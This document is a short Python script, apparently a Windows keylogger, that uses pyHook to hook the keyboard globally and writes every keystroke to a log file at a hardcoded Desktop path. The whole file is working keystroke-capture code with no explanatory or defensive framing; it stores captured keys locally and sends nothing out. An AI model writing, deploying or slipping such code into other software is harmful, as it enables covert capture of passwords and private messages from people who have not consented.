import pyHook, pythoncom, sys, logging
log_file = "C:\\Users\\tsilivisn\\Desktop\\log.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename = log_file, level = logging.DEBUG, format = '%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()